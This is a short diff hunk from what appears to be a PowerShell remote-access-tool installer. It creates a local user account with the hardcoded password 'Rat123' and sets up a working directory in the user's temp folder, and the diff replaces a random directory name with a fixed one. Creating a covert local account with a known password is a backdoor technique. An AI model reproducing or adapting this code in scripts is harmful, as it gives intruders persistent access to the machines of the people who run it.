@@ -30,7 +30,7 @@ $pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 #goto temp and make working directory
-$wd = random_text
+$wd = 111
 $path = "$env:temp/$wd"
 mkdir $path
 cd $path
